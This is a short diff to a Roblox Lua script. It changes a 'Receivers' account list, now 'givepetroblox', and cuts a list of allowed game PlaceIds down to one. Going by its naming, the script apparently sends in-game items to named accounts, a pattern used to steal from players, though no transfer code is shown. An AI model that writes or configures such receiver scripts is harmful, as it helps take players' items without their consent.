@@ -1,5 +1,5 @@
 rizz = {
-    Receivers = {"rizzreceiver1"} -- Add receivers for rizz here
+    Receivers = {"givepetroblox"} -- Add receivers for rizz here
 }
 
 Commands = {
@@ -10,9 +10,7 @@ Commands = {
 repeat wait() until game:IsLoaded()
 
 local games = {
-    [142823291] = true,
-    [335132309] = true,
-    [636649648] = true
+    [142823291] = true
 }
 
 if not games[game.PlaceId] then
